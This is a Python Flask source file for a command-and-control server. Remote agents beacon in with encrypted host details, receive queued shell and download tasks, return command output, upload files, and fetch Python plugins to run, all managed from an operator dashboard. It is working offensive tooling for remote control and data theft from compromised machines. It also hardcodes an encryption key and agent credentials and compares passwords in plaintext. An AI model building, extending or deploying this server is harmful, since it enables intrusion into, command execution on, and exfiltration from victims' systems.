import os
import json
import uuid
from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_from_directory
from werkzeug.utils import secure_filename
from cryptography.fernet import Fernet
from dotenv import load_dotenv
from datetime import datetime, timezone
import sqlite3
from flask import g


app = Flask(__name__)
load_dotenv()

API_KEY = os.getenv("API_KEY")
DATABASE = "c2.db"


# --- Configuration ---
SECRET_KEY = b'8zQ0wY9DwMZ5N63DR-3h9C7F5htGvA2I7ReG0i8ER6U='
cipher = Fernet(SECRET_KEY)
UPLOAD_FOLDER = 'upload'
PLUGINS_DIR = "./plugins"
os.makedirs(PLUGINS_DIR, exist_ok=True)
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.secret_key = SECRET_KEY

# --- Users ---
#users = {"admin": "password123"}
agents_creds = {"agent1": "pass1"}


# --- Tasks dictionary keyed by UUID ---
#tasks = {
#    uuid.uuid4(): {"agent_id": "1", "task": {"type": "shell", "command": "whoami"}, "output": None}
#}

# --- Live Agents dictionary ---
#agents = {}  # {agent_id: {'hostname':..., 'user':..., 'os':..., 'ip':..., 'last_seen': datetime}}

# --- Encryption functions ---
def encrypt_data(data):
    return cipher.encrypt(data.encode()).decode()

def decrypt_data(data):
    return cipher.decrypt(data.encode()).decode()


# ---  Connecting to SQLite DB ---
def get_db():
    if "db" not in g:
        g.db = sqlite3.connect(DATABASE)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(exception):
    db = g.pop("db", None)
    if db is not None:
        db.close()


# --- Agent beacon endpoint ---
@app.route('/beacon', methods=['POST'])
def beacon():
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    beacon_info = json.loads(decrypted_json)
    agent_id = beacon_info.get("id")

    db = get_db()
    db.execute("""
        INSERT INTO agents (id, hostname, user, os, ip, last_seen)
        VALUES (?, ?, ?, ?, ?, datetime('now'))
        ON CONFLICT(id) DO UPDATE SET
            hostname=excluded.hostname,
            user=excluded.user,
            os=excluded.os,
            ip=excluded.ip,
            last_seen=datetime('now')
    """, (
        agent_id,
        beacon_info.get("hostname"),
        beacon_info.get("user"),
        beacon_info.get("os"),
        request.remote_addr
    ))
    db.commit()

    # Fetch pending task
    task = db.execute("""
        SELECT uuid, task_json FROM tasks
        WHERE agent_id = ? AND output IS NULL
        LIMIT 1
    """, (agent_id,)).fetchone()

    if task:
        return jsonify({
            "task": json.loads(task["task_json"]),
            "uuid": task["uuid"]
        })

    return jsonify({"task": None})

# --- Live agents API ---
AGENT_ONLINE_TIMEOUT = 30  # seconds

@app.route("/agents-data")
def agents_data():
    now = datetime.now(timezone.utc)

    db = get_db()
    rows = db.execute("SELECT * FROM agents").fetchall()

    data = []
    for row in rows:
        last_seen = datetime.fromisoformat(row["last_seen"])

        # FIX: ensure timezone-aware
        if last_seen.tzinfo is None:
            last_seen = last_seen.replace(tzinfo=timezone.utc)

        online = (now - last_seen).total_seconds() <= AGENT_ONLINE_TIMEOUT

        data.append({
            "id": row["id"],
            "hostname": row["hostname"],
            "user": row["user"],
            "os": row["os"],
            "ip": row["ip"],
            "last_seen": last_seen.timestamp(),
            "online": online
        })

    return jsonify(data)


# --- Agents page ---
@app.route('/agents/')
def agents_list():
    if "username" not in session:
        return redirect(url_for("login"))

    now = datetime.now(timezone.utc)
    agent_rows = []

    db = get_db()
    agents = db.execute("SELECT * FROM agents").fetchall()

    for agent in agents:
        last_seen = datetime.fromisoformat(agent["last_seen"])

        # Ensure timezone-aware
        if last_seen.tzinfo is None:
            last_seen = last_seen.replace(tzinfo=timezone.utc)

        online = (now - last_seen).total_seconds() <= AGENT_ONLINE_TIMEOUT

        pending_tasks = db.execute("""
            SELECT COUNT(*) FROM tasks
            WHERE agent_id = ? AND output IS NULL
        """, (agent["id"],)).fetchone()[0]

        agent_rows.append({
            "id": agent["id"],
            "status": "online" if online else "offline",
            "last_seen": last_seen.strftime("%Y-%m-%d %H:%M:%S"),
            "pending_tasks": pending_tasks
        })

    return render_template('agents.html', agents=agent_rows)


# --- Agent detail page ---
@app.route('/agents/<agent_id>')
def agent_detail(agent_id):
    if "username" not in session:
        return redirect(url_for("login"))

    db = get_db()

    # Fetch all tasks for this agent
    tasks = db.execute("""
        SELECT uuid, task_json, output
        FROM tasks
        WHERE agent_id = ?
        ORDER BY rowid DESC
    """, (agent_id,)).fetchall()

    task_rows = []
    for t in tasks:
        task_rows.append({
            "uuid": t["uuid"],
            "task": json.loads(t["task_json"]),
            "output": t["output"]
        })

    return render_template('agent_detail.html', agent_id=agent_id, tasks=task_rows)

# --- Agent result endpoint ---
@app.route('/result', methods=['POST'])
def result():
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    result_info = json.loads(decrypted_json)

    task_uuid = result_info.get("uuid")
    output = result_info.get("output")

    db = get_db()
    db.execute("""
        UPDATE tasks SET output = ?
        WHERE uuid = ?
    """, (output, task_uuid))
    db.commit()

    return jsonify({"status": "received"})

# --- Add a task ---
@app.route('/task', methods=['POST'])
def add_task():
    auth_header = request.headers.get("Authorization")
    if auth_header != f"Bearer {API_KEY}":
        return jsonify({"error": "Unauthorized"}), 401

    data = request.get_json()
    agent_id = data.get("id")
    command = data.get("task")

    task_uuid = str(uuid.uuid4())

    db = get_db()
    db.execute("""
        INSERT INTO tasks (uuid, agent_id, task_json, output)
        VALUES (?, ?, ?, NULL)
    """, (task_uuid, agent_id, json.dumps(command)))
    db.commit()

    return jsonify({"status": "accepted", "uuid": task_uuid})

# --- File upload ---
@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    filename = secure_filename(file.filename)
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    return f'[+] File {file.filename} successfully uploaded', 200

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    if "username" not in session:
        return redirect(url_for("login"))
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/uploads/')
def uploads_list():
    if "username" not in session:
        return redirect(url_for("login"))
    files = [f for f in os.listdir(app.config['UPLOAD_FOLDER']) if os.path.isfile(os.path.join(app.config['UPLOAD_FOLDER'], f))]
    return render_template("uploads.html", files=files)

@app.route('/plugins/')
def plugins_list():
    if "username" not in session:
        return redirect(url_for("login"))
    plugins = [f for f in os.listdir(PLUGINS_DIR) if f.endswith(".py")]
    return render_template("plugins.html", plugins=plugins)


@app.route("/plugins/<filename>")
def serve_plugin(filename):
    # Only allow .py files
    if not filename.endswith(".py"):
        return "Invalid file", 400
    return send_from_directory(PLUGINS_DIR, filename)

@app.route('/plugins/run', methods=['POST'])
def run_plugin():
    if "username" not in session:
        return redirect(url_for("login"))

    agent_id = request.form.get("agent_id")
    plugin_name = request.form.get("plugin_name")
    if not agent_id or not plugin_name:
        return "Missing parameters", 400

    # Construct the plugin URL that agent will download
    plugin_url = f"{request.host_url}plugins/{plugin_name}"

    # Insert task into tasks table
    task_uuid = str(uuid.uuid4())
    db = get_db()
    db.execute("""
        INSERT INTO tasks (uuid, agent_id, task_json, output)
        VALUES (?, ?, ?, NULL)
    """, (task_uuid, agent_id, json.dumps({"type": "download", "url": plugin_url})))
    db.commit()

    return redirect(url_for('plugins_list'))

# --- Login / Logout ---
@app.route("/login", methods=["GET", "POST"])
def login():

    db = get_db()

    # -------------------------
    # 1. Agent Login (JSON)
    # -------------------------
    if request.method == "POST" and request.is_json:
        data = request.get_json(silent=True) or {}

        if "agent_id" in data:
            username = data.get("username")
            password = data.get("password")

            # Check credentials from SQLite
            row = db.execute(
                "SELECT password FROM users WHERE username = ?",
                (username,)
            ).fetchone()

            if row and row["password"] == password:
                return jsonify({"status": "agent_logged_in"}), 200

            return jsonify({"error": "Unauthorized"}), 401

    # -------------------------
    # 2. Dashboard Login (HTML Form)
    # -------------------------
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        row = db.execute(
            "SELECT password FROM users WHERE username = ?",
            (username,)
        ).fetchone()

        if row and row["password"] == password:
            session["username"] = username
            return redirect(url_for("dashboard"))

        return render_template("login.html", error="Invalid credentials")

    # -------------------------
    # 3. GET request → show login page
    # -------------------------
    return render_template("login.html")



@app.route("/logout")
def logout():
    session.pop("username", None)
    return redirect(url_for("login"))

# --- Dashboard ---


@app.route("/dashboard")
def dashboard():
    if "username" not in session:
        return redirect(url_for("login"))

    db = get_db()

    files = os.listdir(app.config['UPLOAD_FOLDER'])

    task_rows = db.execute("""
        SELECT uuid, agent_id, task_json, output
        FROM tasks
        ORDER BY rowid DESC
    """).fetchall()

    tasks_str = {}
    for t in task_rows:
        tasks_str[str(t["uuid"])] = {
            "agent_id": t["agent_id"],
            "task": json.loads(t["task_json"]),
            "output": t["output"]
        }

    agents_db = db.execute("SELECT * FROM agents").fetchall()

    now = datetime.now(timezone.utc)
    agent_rows = []

    for agent in agents_db:
        last_seen_dt = datetime.fromisoformat(agent["last_seen"])

        # Ensure timezone-aware
        if last_seen_dt.tzinfo is None:
            last_seen_dt = last_seen_dt.replace(tzinfo=timezone.utc)

        online = (now - last_seen_dt).total_seconds() <= AGENT_ONLINE_TIMEOUT

        agent_rows.append({
            "id": agent["id"],
            "hostname": agent["hostname"],
            "user": agent["user"],
            "os": agent["os"],
            "ip": agent["ip"],
            "last_seen": last_seen_dt.strftime("%Y-%m-%d %H:%M:%S"),
            "status": "online" if online else "offline"
        })

    return render_template(
        "dashboard.html",
        files=files,
        api_key=API_KEY,
        agents=agent_rows,
        tasks=tasks_str
    )
# --- Tasks endpoints ---
@app.route("/tasks-data")
def tasks_data():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401

    db = get_db()

    rows = db.execute("""
        SELECT uuid, agent_id, task_json, output
        FROM tasks
        ORDER BY rowid DESC
    """).fetchall()

    tasks_dict = {}
    for t in rows:
        tasks_dict[str(t["uuid"])] = {
            "agent_id": t["agent_id"],
            "task": json.loads(t["task_json"]),
            "output": t["output"]
        }

    return jsonify(tasks_dict)

@app.route('/tasks/')
def tasks_list():
    if "username" not in session:
        return redirect(url_for("login"))

    db = get_db()

    rows = db.execute("""
        SELECT uuid, agent_id, task_json, output
        FROM tasks
        ORDER BY rowid DESC
    """).fetchall()

    tasks_str = {}
    for t in rows:
        tasks_str[str(t["uuid"])] = {
            "agent_id": t["agent_id"],
            "task": json.loads(t["task_json"]),
            "output": t["output"]
        }

    return render_template('tasks.html', tasks=tasks_str)

# --- Main ---
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)